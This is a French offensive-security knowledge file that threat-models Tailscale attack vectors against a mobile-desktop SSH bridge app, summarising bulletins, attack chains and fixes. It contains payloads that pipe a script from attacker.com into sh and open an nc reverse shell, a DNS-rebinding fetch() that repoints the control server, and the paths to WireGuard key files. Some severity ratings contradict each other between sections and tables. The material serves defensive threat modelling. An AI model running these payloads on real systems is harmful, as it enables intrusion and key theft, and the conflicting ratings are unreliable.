# Vecteurs d'Attaque Tailscale -- Base de connaissance offensive
# Skill : adversary-simulation | Fichier knowledge
# Architecture cible : Mobile (ChillShell) -> Tailscale mesh -> Desktop (Chill) -> SSH -> PC

> **Source** : Extractions de CYBERSEC_MOBILE.md et CYBERSEC_DESKTOP.md

---

## TABLE DES MATIERES

1. [RCE root via tssentineld (macOS)](#1--rce-root-via-tssentineld-macos--ts-2026-001)
2. [Tailnet Lock bypass sans --statedir](#2--tailnet-lock-bypass-sans---statedir--ts-2025-008)
3. [Reutilisation de cle d'auth one-off (TOCTOU)](#3--reutilisation-de-cle-dauth-one-off-toctou--ts-2025-007)
4. [Bypass ACL sur sous-reseaux partages](#4--bypass-acl-sur-sous-reseaux-partages--ts-2025-006)
5. [Cles MDM logguees vers serveurs Tailscale](#5--cles-mdm-logguees-vers-serveurs-tailscale--ts-2025-005)
6. [Intrusion via domaine email partage](#6--intrusion-via-domaine-email-partage--ts-2025-004)
7. [CSRF RCE via DNS Rebinding (Windows)](#7--csrf-rce-via-dns-rebinding-windows--ghsa-vqp6-rc3h-83cp)
8. [Fuite de variables d'environnement (Peer API)](#8--fuite-de-variables-denvironnement-peer-api--ghsa-qccm-wmcq-pwr6)
9. [Attaques sur les relais DERP](#9--attaques-sur-les-relais-derp)
10. [MagicDNS / Funnel / Exit Nodes](#10--magicdns--funnel--exit-nodes)
11. [Exploitation des cles expirees](#11--exploitation-des-cles-expirees)
12. [Headscale (self-hosted)](#12--headscale-self-hosted)
13. [Pieges ACL -- erreurs de configuration](#13--pieges-acl--erreurs-de-configuration)
14. [Attaques WireGuard sous-jacentes](#14--attaques-wireguard-sous-jacentes)
15. [Chaines d'attaque combinees](#15--chaines-dattaque-combinees)
16. [Bulletins de securite complets TS-2025-002 a TS-2026-001](#16--bulletins-de-securite-complets-ts-2025-002-a-ts-2026-001)
17. [Operateurs DPRK etudiant Tailscale](#17--operateurs-dprk-etudiant-tailscale)
18. [Tailscale 1.94.1 -- fonctionnalites securitaires](#18--tailscale-1941--fonctionnalites-securitaires)
19. [WireGuard post-quantique](#19--wireguard-post-quantique)
20. [WireGuard identifiable par DPI et obfuscation](#20--wireguard-identifiable-par-dpi-et-obfuscation)

---

## 1 -- RCE root via tssentineld (macOS) -- TS-2026-001

- **Cible** : Desktop macOS (app Chill)
- **Complexite** : Expert
- **Versions affectees** : Tailscale 1.84.0 a 1.92.3 (macOS standalone)

### Description technique

Le service `tssentineld` s'execute en **root** sur macOS. Il utilise `NSTask` pour lancer des commandes shell de la forme :

```bash
/bin/sh -c sudo -u [username] ...
```

La substitution de chaine pour `[username]` n'est **pas securisee**. L'attaquant injecte des commandes shell qui s'executent avec privileges root.

### Scenario d'exploitation

1. L'attaquant obtient un acces local au Mac (physique, malware, ou via une autre faille)
2. Il modifie le username injecte dans la chaine NSTask
3. Payload : `user$(curl attacker.com/shell.sh|sh)` ou `user;nc -e /bin/sh attacker.com 4444`
4. tssentineld execute la commande avec privileges root
5. Shell root sur le Mac qui fait tourner le bridge Chill

### Impact

- Compromission totale du desktop bridge macOS
- Acces a toutes les cles SSH stockees par l'app Chill
- Pivot vers le PC cible via le tunnel SSH existant

### Version corrigee : Tailscale >= 1.94.0

---

## 2 -- Tailnet Lock bypass sans --statedir -- TS-2025-008

- **Cible** : Desktop Linux / Docker (app Chill avec Go daemon tsnet)
- **Complexite** : Intermediaire

### Description technique

Tailnet Lock (TKA) est le mecanisme de verification cryptographique des noeuds. Quand un noeud demarre **sans repertoire d'etat defini** (pas de `--statedir` ou `TS_STATE_DIR`), il echoue a charger la liste des signataires de confiance.

**Comportement critique** : au lieu de bloquer la connexion (fail closed), le daemon **ignore silencieusement** les verifications de signature et accepte le noeud.

### Scenario d'exploitation

1. Le daemon tsnet du desktop Chill tourne sans `--statedir` (frequent en Docker ou en dev)
2. L'attaquant cree un noeud Tailscale malveillant (via un compte compromis ou une cle d'auth volee)
3. Le noeud malveillant s'insere dans le mesh sans verification de signature TKA
4. Depuis ce noeud, l'attaquant accede directement au desktop bridge via SSH

### Verification

```bash
# Verifier si --statedir est configure
ps aux | grep tailscaled
# Chercher l'absence de --statedir ou --state= dans les arguments

# Via l'API locale Tailscale
curl http://localhost:41112/localapi/v0/tka/status
```

---

## 3 -- Reutilisation de cle d'auth one-off (TOCTOU) -- TS-2025-007

- **Cible** : Mobile + Desktop
- **Complexite** : Expert

Race condition **Time-of-Check-Time-of-Use** dans le mecanisme de cles d'authentification one-off. Une cle one-off est censee n'etre utilisable qu'une seule fois. La race condition permet d'enregistrer **plusieurs noeuds** avec une seule cle.

### Scenario d'exploitation

1. L'attaquant intercepte ou vole une cle d'auth one-off (via les logs -- TS-2025-005)
2. Il envoie simultanement plusieurs requetes d'enregistrement
3. La race condition permet a 2+ noeuds de s'enregistrer
4. Noeuds non autorises presents dans le tailnet

---

## 4 -- Bypass ACL sur sous-reseaux partages -- TS-2025-006

- **Cible** : Mobile + Desktop
- **Complexite** : Intermediaire

Les **filtres de protocole dans les ACLs Tailscale** ne s'appliquent pas correctement sur les **subnet routers partages**. Les restrictions de protocole (ex: "uniquement TCP port 22") ne sont pas appliquees.

### Scenario d'exploitation

1. L'architecture Chill utilise un subnet router pour atteindre le PC cible
2. L'attaquant (present dans le tailnet) accede a ce subnet router
3. Les ACLs qui restreignaient l'acces au seul port SSH sont contournees
4. L'attaquant accede a SMB (445), RDP (3389), HTTP interne, etc.

### Correction : Corrige cote control plane (octobre 2025)

---

## 5 -- Cles MDM logguees vers serveurs Tailscale -- TS-2025-005

- **Cible** : Mobile iOS/macOS
- **Complexite** : Intermediaire
- **Versions affectees** : Tailscale 1.84.0 a 1.86.2

Les cles d'authentification fournies par MDM sont **journalisees en clair** vers les serveurs de logs centraux de Tailscale.

### Version corrigee : Tailscale >= 1.86.4

---

## 6 -- Intrusion via domaine email partage -- TS-2025-004

- **Cible** : Mobile + Desktop (tailnet entier)
- **Complexite** : Script kiddie

Les tailnets configures avec des **domaines email partages** (@gmail.com, @outlook.com) permettent a n'importe qui avec une adresse email sur ce domaine de **rejoindre automatiquement le tailnet**.

### Scenario d'exploitation

1. L'utilisateur configure son tailnet avec @gmail.com
2. L'attaquant cree un compte Google quelconque
3. Il rejoint le tailnet automatiquement
4. Il voit tous les noeuds et tente des connexions

### Impact : Le tailnet (perimetre de securite) est totalement neutralise

---

## 7 -- CSRF RCE via DNS Rebinding (Windows) -- GHSA-vqp6-rc3h-83cp

- **Cible** : Desktop Windows
- **Complexite** : Expert

### Description technique

L'API locale de Tailscale sur Windows ecoute sur un **socket TCP local** sans verifier l'en-tete `Host`. Vulnerable au **DNS Rebinding**.

```
1. L'attaquant controle evil.com avec DNS a TTL tres court
2. Premiere resolution : evil.com -> IP de l'attaquant (charge la page JS)
3. Deuxieme resolution : evil.com -> 127.0.0.1 (rebind vers localhost)
4. Le JavaScript s'execute "sur" 127.0.0.1
5. Il peut appeler l'API locale Tailscale
```

### Code d'exploitation

```javascript
fetch('http://evil.com:41112/localapi/v0/prefs', {
  method: 'PATCH',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    ControlURL: 'https://attacker-control-server.com'
  })
});
```

### Impact

- RCE sur le desktop bridge simplement en faisant visiter un site web
- Controle du tunnel VPN : l'attaquant voit tout le trafic mobile <-> desktop
- Injection de commandes SSH, vol de cles, manipulation des reponses

---

## 8 -- Fuite de variables d'environnement (Peer API) -- GHSA-qccm-wmcq-pwr6

- **Cible** : Desktop (tous OS)
- **Complexite** : Expert

L'acces a l'API Peer de Tailscale permet la **lecture des variables d'environnement** du processus :
- `TS_AUTHKEY` -- cle d'authentification Tailscale
- `SSH_AUTH_SOCK` -- socket de l'agent SSH
- Tokens API divers
- Chemins vers les cles privees

---

## 9 -- Attaques sur les relais DERP

- **Cible** : Mobile + Desktop (communication non P2P)
- **Criticite** : Moyenne a Haute

### Ce que les serveurs DERP peuvent observer

- IPs source et destination
- Volume de trafic (taille, frequence)
- Timing des echanges
- Duree des sessions

### Vecteurs d'attaque DERP

1. **Compromission du control plane** : reconfigurer le routage pour forcer le trafic vers un DERP malveillant
2. **DERP malveillant (Headscale)** : insertion d'un DERP qui enregistre les metadonnees
3. **Analyse de trafic avancee** : Meme chiffre E2E, correlation taille paquets -> type de commande SSH, patterns timing -> frappes clavier

### Impact : Si le mobile et le desktop ne peuvent pas etablir une connexion P2P (NAT 4G/5G), TOUT passe par DERP

---

## 10 -- MagicDNS / Funnel / Exit Nodes

### 10.1 MagicDNS Spoofing

Un attaquant intra-tailnet peut enregistrer un noeud avec un nom similaire au desktop bridge. Si l'app utilise MagicDNS, elle peut se connecter au mauvais noeud.

### 10.2 Funnel / Serve -- exposition accidentelle

`tailscale funnel` et `tailscale serve` exposent des services **sur Internet public**. Si active accidentellement -> le service SSH du PC expose sur Internet.

### 10.3 Exit Node malveillant

Un exit node dans le tailnet route **tout le trafic Internet** du device. Si l'utilisateur active un exit node compromis -> interception de tout le trafic non-WireGuard.

---

## 11 -- Exploitation des cles expirees

- **Cible** : Desktop (bridge permanent)
- **Criticite** : Haute

Tailscale impose une expiration des cles (180 jours). "Disable key expiry" est frequent pour les serveurs. Si un attaquant extrait les cles, elles restent **valides indefiniment**. Backdoor permanente.

---

## 12 -- Headscale (self-hosted)

Si l'utilisateur utilise Headscale (open-source) au lieu du SaaS Tailscale :
1. Mise a jour retardee
2. Configuration par defaut moins securisee
3. Surface d'attaque web supplementaire
4. Base de donnees des cles WireGuard de TOUS les noeuds
5. Compromission de Headscale = compromission de **tout le mesh**

---

## 13 -- Pieges ACL -- erreurs de configuration

### Erreurs frequentes exploitables

**Wildcard dangereux :**
```json
{
  "action": "accept",
  "src": ["*"],
  "dst": ["*:*"]
}
```

**Filtres non appliques sur subnet routers partages (TS-2025-006)** -- voir section 4

**Tags mal attribues** : Un noeud sans tag herite des permissions par defaut (souvent larges)

---

## 14 -- Attaques WireGuard sous-jacentes

### 14.1 Pas de Perfect Forward Secrecy au niveau session

WireGuard utilise des cles statiques. Si la cle privee est compromise + "Disable key expiry" actif, un attaquant qui a enregistre le trafic peut potentiellement le dechiffrer.

### 14.2 Fingerprinting du protocole

Paquets WireGuard reconnaissables (type 1-4, longueur fixe pour les handshakes). Identification facile d'un tunnel Tailscale.

### 14.3 Localisation des cles WireGuard

```
# Linux
/var/lib/tailscale/tailscaled.state

# Windows
%LocalAppData%\Tailscale\tailscaled.state

# macOS
~/Library/Tailscale/tailscaled.state
```

Un attaquant local peut lire ces fichiers et extraire les cles privees WireGuard.

---

## 15 -- Chaines d'attaque combinees

### Chaine 1 -- "De l'email a la compromission totale" (Windows)

```
Site web malveillant (phishing)
  -> DNS Rebinding -> API locale Tailscale (GHSA-vqp6-rc3h-83cp)
  -> Changement du serveur de coordination
  -> Injection de noeud malveillant
  -> Bypass ACL subnet router (TS-2025-006)
  -> Acces SSH au PC cible + pivot LAN
```

### Chaine 2 -- "Noeud fantome permanent" (Linux/Docker)

```
Tailnet Lock bypass (TS-2025-008, pas de --statedir)
  -> Cle d'auth one-off reutilisee (TS-2025-007 TOCTOU)
  -> Noeud malveillant insere dans le mesh
  -> Disable key expiry -> backdoor permanente
  -> Fuite variables d'environnement (GHSA-qccm-wmcq-pwr6)
  -> Extraction cles SSH + acces total au PC
```

### Chaine 3 -- "L'insider qui reste" (toute plateforme)

```
Domaine email partage (TS-2025-004)
  -> Noeud malveillant dans le tailnet (acces trivial)
  -> Exit node malveillant active
  -> Interception du trafic Internet
  -> Vol de cookies, tokens, redirections phishing
  -> Compromission des comptes cloud
```

### Chaine 4 -- "macOS root chain"

```
TS-2026-001 (RCE root via tssentineld)
  -> Acces root sur le Mac
  -> Lecture de tailscaled.state (cles WireGuard)
  -> Lecture des cles SSH stockees par Chill
  -> Acces permanent au PC cible + a tout le tailnet
  -> Installation rootkit macOS
```

---

## Recapitulatif des bulletins et CVEs Tailscale

| Reference | Nom | Severite | Cible | Corrige |
|-----------|-----|----------|-------|---------|
| TS-2026-001 | RCE root tssentineld | Critique | macOS | >= 1.94.0 |
| TS-2025-008 | Tailnet Lock bypass | Haute | Linux/Docker | --statedir obligatoire |
| TS-2025-007 | TOCTOU cle one-off | Haute | Tous | Correction control plane |
| TS-2025-006 | Bypass ACL subnet | Haute | Tous | Correction oct. 2025 |
| TS-2025-005 | Cles MDM dans les logs | Moyenne | iOS/macOS | >= 1.86.4 |
| TS-2025-004 | Domaine email partage | Haute | Tous | Configuration utilisateur |
| GHSA-vqp6-rc3h-83cp | CSRF RCE DNS Rebinding | Critique | Windows | Versions recentes |
| GHSA-qccm-wmcq-pwr6 | Fuite env vars Peer API | Haute | Tous | Versions recentes |

---

## 16 -- Bulletins de securite complets TS-2025-002 a TS-2026-001

Cette section fournit le detail des 8 bulletins de securite Tailscale publies entre mai 2025 et janvier 2026.

### 16.1 TS-2025-002 -- Elevation de privileges via proxy Grafana

- **Date** : 15 mai 2025
- **Severite** : Moyenne
- **Description** : Spoofing des en-tetes `X-Webauth-*` lors de l'utilisation du proxy Grafana via Tailscale. Un attaquant intra-tailnet peut usurper l'identite d'un autre utilisateur Grafana.
- **Pertinence ChillShell/Chill** : Si le desktop utilise Grafana pour le monitoring via Tailscale, un noeud compromis peut usurper l'identite admin Grafana.
- **Correction** : Mise a jour du proxy

### 16.2 TS-2025-003 -- Timing attack sur l'authentification DERP mesh

- **Date** : 21 mai 2025
- **Severite** : Faible-Moyenne
- **Description** : L'authentification DERP mesh n'utilisait pas de comparaison **constant-time**. Un attaquant pouvait mesurer les temps de reponse pour deduire des informations sur les cles d'authentification DERP.
- **Pertinence ChillShell/Chill** : Le desktop bridge communique via DERP quand la connexion P2P directe est impossible (NAT 4G/5G, pare-feu). L'authentification non constant-time permet une attaque par timing sur le relais DERP.
- **Scenario d'attaque** :
  1. L'attaquant se positionne sur le meme DERP que le desktop bridge
  2. Il envoie des tentatives d'authentification avec differentes valeurs
  3. Il mesure les temps de reponse pour chaque tentative
  4. Par analyse statistique, il deduit progressivement la cle d'authentification DERP
  5. Avec la cle DERP, il peut intercepter ou manipuler le trafic relaye
- **Correction** : Patch serveur

### 16.3 TS-2025-004 -- 664 domaines email partages (detail complet)

- **Date** : 27 mai 2025
- **Severite** : Moyenne
- **Description** : Tailscale a identifie **664 domaines email partages** (dont @gmail.com, @outlook.com, @yahoo.com) qui, s'ils sont utilises pour configurer un tailnet, permettent a N'IMPORTE QUI ayant une adresse email sur ce domaine de rejoindre automatiquement le tailnet.
- **Pertinence ChillShell/Chill** : Un utilisateur configurant son tailnet avec @gmail.com expose TOUT son reseau a n'importe quel utilisateur Gmail.
- **Correction** : User Approval active par defaut pour les domaines partages

### 16.4 TS-2025-005 -- Cles MDM logguees iOS/macOS (detail complet)

- **Date** : 7 aout 2025
- **Severite** : Moyenne
- **Versions affectees** : Tailscale iOS/macOS 1.84.0 a 1.86.2
- **Description** : Les cles d'authentification fournies par MDM (Mobile Device Management) etaient **journalisees en clair** vers les serveurs de logs centraux de Tailscale. Cela inclut les cles d'enrollement de noeuds mobiles iOS et macOS.
- **Pertinence ChillShell/Chill** : Si l'app mobile iOS utilise Tailscale avec MDM dans cette plage de versions, les cles d'authentification ont ete transmises aux serveurs Tailscale. Un employe Tailscale ou un attaquant ayant compromis l'infrastructure Tailscale pourrait les recuperer.
- **Correction** : Mise a jour Tailscale >= 1.86.4

### 16.5 TS-2025-006 -- Contournement filtres ACL sur sous-reseaux (detail complet)

- **Date** : 28 octobre 2025
- **Severite** : Moyenne
- **Description** : Les filtres de protocole dans les ACLs ne s'appliquaient pas correctement sur les **routeurs de sous-reseau partages**. Une regle autorisant le trafic UDP autorisait egalement le trafic TCP vers le meme port. Les restrictions de protocole etaient ignorees.
- **Pertinence ChillShell/Chill** : Si le desktop bridge agit comme routeur de sous-reseau Tailscale pour donner acces au LAN, les ACLs ne filtraient PAS correctement. Un noeud mobile malveillant pouvait acceder a des services TCP censes etre bloques (SMB 445, RDP 3389, HTTP interne).
- **Scenario d'attaque** :
  1. L'admin configure une ACL "autoriser UDP 22 seulement" sur le subnet router
  2. Un noeud malveillant dans le tailnet teste TCP 445 (SMB)
  3. La regle UDP autorise aussi TCP -> l'acces SMB est accorde
  4. L'attaquant accede aux partages reseau, RDP, services internes
- **Correction** : Correctif cote control plane (octobre 2025)

### 16.6 TS-2025-007 -- Race condition cles one-off (detail complet)

- **Date** : 7 novembre 2025
- **Severite** : Faible
- **Description** : Race condition TOCTOU (Time-of-Check-Time-of-Use) dans le mecanisme de cles d'authentification one-off. En envoyant simultanement plusieurs requetes d'enregistrement, un attaquant peut enregistrer **plusieurs noeuds** avec une seule cle censee n'etre utilisable qu'une fois.
- **Correction** : Correctif cote serveur

### 16.7 TS-2025-008 -- Contournement Tailnet Lock sans --statedir (detail complet)

- **Date** : 19 novembre 2025
- **Severite** : Moyenne
- **Versions affectees** : tailscaled sans `--statedir` configure
- **Description** : Les noeuds `tailscaled` lances sans `--statedir` ou `TS_STATE_DIR` sautaient la verification TKA (Tailnet Key Authority). Le Tailnet Lock etait contourne **silencieusement** -- pas de message d'erreur, pas d'alerte.
- **Pertinence ChillShell/Chill** : Le daemon tsnet du desktop Chill en Docker ou en developpement peut tourner sans `--statedir`. Le Tailnet Lock est alors inoperant.
- **Correction** : Mise a jour Tailscale >= 1.90.8

### 16.8 TS-2026-001 -- RCE root macOS tssentineld (detail complet)

- **Date** : 15 janvier 2026
- **Severite** : **Haute**
- **Versions affectees** : macOS standalone 1.84.0 a 1.92.3 avec MDM AlwaysOn
- **Description** : Le service `tssentineld` s'execute en root et utilise `NSTask` pour lancer des commandes shell avec substitution de chaine non securisee pour le nom d'utilisateur. Injection de commandes shell avec privileges root.
- **Correction** : Mise a jour Tailscale >= 1.94.0

---

## 17 -- Operateurs DPRK etudiant Tailscale

- **Source** : Rapport OpenAI "Disrupting Malicious Uses of AI" (5 juin 2025)
- **Description** : Des operateurs nord-coreens ont utilise ChatGPT pour rechercher **Tailscale VPN peer-to-peer** dans le cadre d'operations de travail frauduleux a distance. Objectif : acceder a distance aux laptops d'entreprise via des "laptop mules" americains.
- **Tailscale n'a PAS ete compromis** -- il a ete etudie comme outil d'abus potentiel.
- **Pertinence ChillShell/Chill** : Le desktop bridge EST le type de machine que ces operateurs cibleraient -- acces distant persistant a un reseau interne. Le modele d'architecture ChillShell/Chill (mobile -> Tailscale -> desktop -> PC) est EXACTEMENT le pattern recherche par les operateurs DPRK.
- **Scenario d'attaque** :
  1. Un operateur DPRK obtient un acces a un tailnet via social engineering ou cle volee
  2. Il identifie le desktop bridge via le mesh Tailscale
  3. Il utilise le bridge comme point d'acces permanent au reseau de l'entreprise
  4. Exfiltration de donnees via le tunnel chiffre Tailscale (invisible aux IDS)

---

## 18 -- Tailscale 1.94.1 -- fonctionnalites securitaires

### 18.1 Chiffrement des fichiers d'etat via TPM

- **Statut** : GA (disponibilite generale) puis retire du defaut en v1.92.5 pour problemes de compatibilite TPM
- **Fonctionnement** : Les fichiers d'etat Tailscale (contenant les cles WireGuard privees) sont chiffres via le TPM de la machine
- **Pertinence ChillShell/Chill** : Quand fonctionnel, cette fonctionnalite protege les cles Tailscale du desktop bridge contre l'extraction par un attaquant local. Le fichier `tailscaled.state` chiffre via TPM ne peut pas etre lu sur une autre machine.
- **Limitation** : Retire du defaut en v1.92.5, donc pas active automatiquement

### 18.2 Federation d'identite workload (OIDC ephemere)

- **Description** : Tokens OIDC ephemeres remplacant les cles d'authentification statiques
- **Pertinence ChillShell/Chill** : Plus sur pour le desktop bridge -- les tokens expirent automatiquement, eliminant le risque de cle d'auth volee indefiniment valide
- **Avantage** : Supprime le vecteur d'attaque "cle d'auth one-off reutilisee" (TS-2025-007) et "cle expiration desactivee" (section 11)

### 18.3 Audit SSH integre

- **Description** : Messages LOGIN envoyes au sous-systeme d'audit kernel dans v1.94.1
- **Pertinence ChillShell/Chill** : Le desktop bridge peut loguer toutes les connexions SSH via Tailscale dans les logs systeme. Detection d'intrusion facilitee.

---

## 19 -- WireGuard post-quantique

### 19.1 ExpressVPN PQ-WireGuard (aout 2025)

- **Statut** : En production
- **Technologie** : ML-KEM hybride + X25519 via PSK sur TLS 1.3
- **Surcout** : 15-20 ms a l'etablissement, aucun impact en regime permanent
- **Disponibilite** : iOS, Android, Windows
- **Pertinence ChillShell/Chill** : Preuve que le WireGuard post-quantique est faisable et deploye a grande echelle. Tailscale pourrait suivre.

### 19.2 Rosenpass v0.2.2

- **Type** : Alternative PQ open source ecrite en Rust
- **Algorithmes** : Classic McEliece + Kyber 512
- **Verification** : Formellement verifie ProVerif
- **Integration** : NetBird, en cours de packaging Debian
- **Pertinence ChillShell/Chill** : Rosenpass pourrait etre deploye sur le PC cible pour ajouter une couche PQ au-dessus de WireGuard, en attendant Tailscale PQ

### 19.3 Tailscale et le post-quantique

- **Statut** : Tailscale n'a **PAS encore annonce** de support PQ-WireGuard
- **Consequence** : Le tunnel Tailscale du desktop bridge est vulnerable au **"harvest now, decrypt later"**
- **Double exposition** : dartssh2 ne supporte pas non plus le PQ -> ni la couche SSH ni la couche WireGuard ne sont protegees contre les ordinateurs quantiques
- **Scenario d'attaque** :
  1. Un adversaire etatique enregistre le trafic WireGuard/Tailscale
  2. Il stocke ce trafic chiffre pendant des annees
  3. Avec l'avenement d'un ordinateur quantique, il dechiffre retroactivement TOUTES les sessions
  4. Les cles SSH, commandes executees, fichiers transferes sont exposes

---

## 20 -- WireGuard identifiable par DPI et obfuscation

### 20.1 Tailles fixes identifiables

Les paquets WireGuard ont des tailles fixes reconnaissables par inspection profonde de paquets (DPI) :

| Type de paquet | Taille (octets) |
|---------------|-----------------|
| Initiation | 148 |
| Reponse | 92 |
| Cookie | 64 |

Structure d'en-tete fixe + trafic UDP haute entropie = identification immediate.

### 20.2 Blocage par etats

- **Great Firewall chinois (GFW)** : Bloque WireGuard en millisecondes par DPI
- **TSPU russe** : Identification et blocage automatique des tunnels WireGuard
- **Impact** : Si des utilisateurs de ChillShell/Chill sont en Chine ou Russie, Tailscale/WireGuard standard sera bloque

### 20.3 Solutions d'obfuscation

| Solution | Technique | Statut |
|----------|-----------|--------|
| **AmneziaWG v1.5** | Constantes aleatoires dans les handshakes | Disponible |
| **Mullvad LWO** | Brouillage des en-tetes WireGuard | Disponible |
| **Encapsulation QUIC** | Le trafic WireGuard ressemble a HTTPS | Disponible |
| **GotaTun + DAITA** | Anti-analyse de trafic par IA | Disponible |

### 20.4 Pertinence ChillShell/Chill

- En environnement normal (LAN, Internet non censure), le fingerprinting WireGuard est un risque mineur
- En environnement d'entreprise avec DPI interne, le tunnel Tailscale peut etre identifie et bloque par les equipes reseau
- En pays avec censure, le service est inutilisable sans obfuscation
- **Tailscale n'integre PAS de mecanisme d'obfuscation natif**

---

## Recapitulatif mis a jour des bulletins et CVEs Tailscale

| Reference | Nom | Severite | Cible | Corrige |
|-----------|-----|----------|-------|---------|
| TS-2026-001 | RCE root tssentineld | Critique | macOS | >= 1.94.0 |
| TS-2025-008 | Tailnet Lock bypass | Haute | Linux/Docker | --statedir obligatoire / >= 1.90.8 |
| TS-2025-007 | TOCTOU cle one-off | Haute | Tous | Correction control plane |
| TS-2025-006 | Bypass ACL subnet UDP->TCP | Haute | Tous | Correction oct. 2025 |
| TS-2025-005 | Cles MDM dans les logs iOS/macOS | Moyenne | iOS/macOS | >= 1.86.4 |
| TS-2025-004 | 664 domaines email partages | Haute | Tous | User Approval par defaut |
| TS-2025-003 | Timing attack auth DERP mesh | Faible-Moyenne | Tous | Patch serveur |
| TS-2025-002 | Elevation privileges proxy Grafana | Moyenne | Grafana | Mise a jour proxy |
| GHSA-vqp6-rc3h-83cp | CSRF RCE DNS Rebinding | Critique | Windows | Versions recentes |
| GHSA-qccm-wmcq-pwr6 | Fuite env vars Peer API | Haute | Tous | Versions recentes |

---

## Sources

- Tailscale Security Bulletins : https://tailscale.com/security-bulletins
- CYBERSEC_MOBILE.md -- Section 2 (Attaques Tailscale)
- CYBERSEC_DESKTOP.md -- Section 2 (Attaques Tailscale)
- WireGuard Protocol : https://www.wireguard.com/protocol/
- IA+SSH+TAILSCALE_COMPLEMENT_MOBILE_3_2026.md -- Sections 6-7 (Tailscale bulletins, WireGuard PQ/DPI)
- IA+SSH+TAILSCALE_COMPLEMENT_DESKTOP_3_2026.md -- Sections 6-7 (Tailscale impact desktop, WireGuard)
- Rapport OpenAI "Disrupting Malicious Uses of AI" (5 juin 2025) -- Operateurs DPRK et Tailscale
- ExpressVPN PQ-WireGuard : https://www.expressvpn.com (aout 2025)
- Rosenpass v0.2.2 : https://rosenpass.eu
